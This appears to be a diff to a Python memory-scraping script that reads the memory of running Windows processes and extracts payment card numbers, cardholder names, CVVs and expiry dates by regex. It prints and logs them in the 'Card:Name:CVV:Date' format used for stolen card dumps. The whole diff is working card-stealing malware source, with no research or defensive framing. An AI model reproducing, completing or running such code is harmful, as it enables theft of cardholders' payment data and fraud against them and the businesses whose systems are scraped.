@@ -1,18 +1,18 @@
-import re
 import ctypes
+import psutil
+import re
 import time
 import threading
 import logging
 from queue import Queue
-import psutil  # For scanning running processes
+
+# Constants required for process memory access
+PROCESS_VM_READ = 0x0010
+PROCESS_QUERY_INFORMATION = 0x0400
 
 # Initialize memory queue and running flag
 memory_queue = Queue()
 running = True
-
-# Process access rights
-PROCESS_VM_READ = 0x0010
-PROCESS_QUERY_INFORMATION = 0x0400
 
 # Regex patterns for card information
 CARD_NUMBER_PATTERN = r'\b(?:\d[ -]*?){13,16}\b'  # Example pattern for 13-16 digit card numbers
@@ -35,10 +35,10 @@ def scan_memory_chunk(memory_chunk):
 
         if card_number and cvv and expiry_date and name:
             card_info = {
-                'Card Number': card_number,
+                'Card': card_number,
                 'Name': name.group(),
                 'CVV': cvv.group(),
-                'Expiry Date': expiry_date.group()
+                'Date': expiry_date.group()
             }
             valid_cards.append(card_info)
     
@@ -62,13 +62,13 @@ def memory_scan_worker(process_handle, pid):
                 valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1', errors='ignore'))
                 if valid_cards:
                     for card in valid_cards:
-                        formatted_output = f"[PID {pid}] {card['Card Number']}:{card['Name']}:{card['CVV']}:{card['Expiry Date']}"
+                        # Print in the format "Card:Name:CVV:Date"
+                        formatted_output = f"{card['Card']}:{card['Name']}:{card['CVV']}:{card['Date']}"
                         print(formatted_output)
                         logging.info(formatted_output)  # Log to file
                 else:
                     print(f"[PID {pid}] No valid card data found in this memory region.")
             else:
-                # Handle the case where ReadProcessMemory fails
                 logging.warning(f"[PID {pid}] Failed to read memory at {base_addr}: Address may not be valid or accessible.")
                 print(f"[PID {pid}] Failed to read memory at address {base_addr}.")
         except Exception as e:
@@ -90,39 +90,6 @@ def get_relevant_pids():
             continue
     return relevant_pids
 
-# Function to retrieve memory regions of a given process
-def get_memory_regions(pid):
-    """ Retrieves the memory regions of the specified process. """
-    memory_regions = []
-    
-    process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
-    if not process_handle:
-        print(f"Could not open process with PID {pid}.")
-        return memory_regions
-    
-    # MEMORY_BASIC_INFORMATION structure
-    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
-        _fields_ = [("BaseAddress", ctypes.c_void_p),
-                    ("AllocationBase", ctypes.c_void_p),
-                    ("AllocationProtect", ctypes.c_ulong),
-                    ("RegionSize", ctypes.c_size_t),
-                    ("State", ctypes.c_ulong),
-                    ("Protect", ctypes.c_ulong),
-                    ("Type", ctypes.c_ulong)]
-    
-    mbi = MEMORY_BASIC_INFORMATION()
-    address = 0
-    while ctypes.windll.kernel32.VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
-        if mbi.State == 0x1000:  # MEM_COMMIT
-            # Consider only readable regions (PAGE_READWRITE, PAGE_READONLY)
-            if mbi.Protect in (0x04, 0x02):
-                memory_regions.append((mbi.BaseAddress, mbi.RegionSize))
-        
-        address += mbi.RegionSize
-
-    ctypes.windll.kernel32.CloseHandle(process_handle)
-    return memory_regions
-
 # Main function to scan memory of automatically detected processes
 def scan_process_memory(num_threads=4):
     pids = get_relevant_pids()
@@ -140,7 +107,6 @@ def scan_process_memory(num_threads=4):
 
         process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
         if not process_handle:
-            logging.error(f"[PID {pid}] Could not open process.")
             print(f"[PID {pid}] Could not open process.")
             continue
 
